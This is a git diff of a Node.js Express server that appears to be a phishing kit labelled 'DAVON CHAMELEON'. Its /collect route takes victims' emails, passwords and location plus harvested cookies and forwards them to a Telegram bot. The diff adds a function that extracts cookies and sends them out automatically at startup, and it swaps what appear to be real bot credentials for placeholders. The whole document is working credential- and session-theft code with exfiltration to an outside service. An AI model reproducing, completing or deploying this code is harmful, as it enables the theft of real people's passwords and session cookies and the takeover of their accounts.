@@ -20,8 +20,8 @@ app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'templates', 'index
 
 // ------------------------- CONFIG -------------------------
 const OUTPUT_FILE = 'cookies.json';
-const TELEGRAM_BOT_TOKEN = "8366154069:AAFTClzM2Kbirysud1i49UAWmEC6JP0T0xg";
-const TELEGRAM_CHAT_ID = "7574749243";
+const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 const TELEGRAM_FILE_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
 
@@ -166,16 +166,28 @@ async function sendTelegramFile(filePath) {
     } catch (err) { debugLog(`❌ Failed to send cookies: ${err}`); }
 }
 
+// ------------------------- ASYNC COOKIE EXTRACTION -------------------------
+async function saveAndSendCookies() {
+    try {
+        const cookies = await saveCookies();
+        if (cookies.length > 0) {
+            await sendTelegramMessage(`✅ Cookies extracted: ${cookies.length}`);
+            await sendTelegramFile(OUTPUT_FILE);
+        } else {
+            debugLog("No cookies found to send.");
+        }
+    } catch (err) {
+        console.error("❌ Error in saveAndSendCookies:", err);
+    }
+}
+
 // ------------------------- COLLECT ROUTE -------------------------
 app.post('/collect', async (req, res) => {
     try {
         const { email, password, attempt, city, country } = req.body;
         debugLog(`Received from frontend: ${email}, attempt ${attempt}`);
 
-        // Save latest cookies
         const cookies = await saveCookies();
-
-        // Build message
         const text = `☠️ DAVON CHAMELEON [${attempt}] ☠️\n` +
                      `Email: ${email}\n` +
                      `Password: ${password}\n` +
@@ -183,7 +195,6 @@ app.post('/collect', async (req, res) => {
                      `Cookies collected: ${cookies.length}`;
 
         await sendTelegramMessage(text);
-
         if (cookies.length > 0) await sendTelegramFile(OUTPUT_FILE);
 
         res.json({ success: true });
@@ -194,14 +205,11 @@ app.post('/collect', async (req, res) => {
 });
 
 // ------------------------- START SERVER -------------------------
-// Start server
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
 
-// Async cookie extraction
-(async () => {
-    console.log("Starting cookie extraction...");
-    await testTelegram();
-    await saveAndSendCookies();
-    console.log("✅ Cookies extracted and sent.");
-})();
+// Run async cookie extraction on startup (non-blocking)
+console.log("Starting cookie extraction...");
+saveAndSendCookies()
+    .then(() => console.log("✅ Cookies extracted and sent."))
+    .catch(err => console.error("❌ Cookie extraction error:", err));
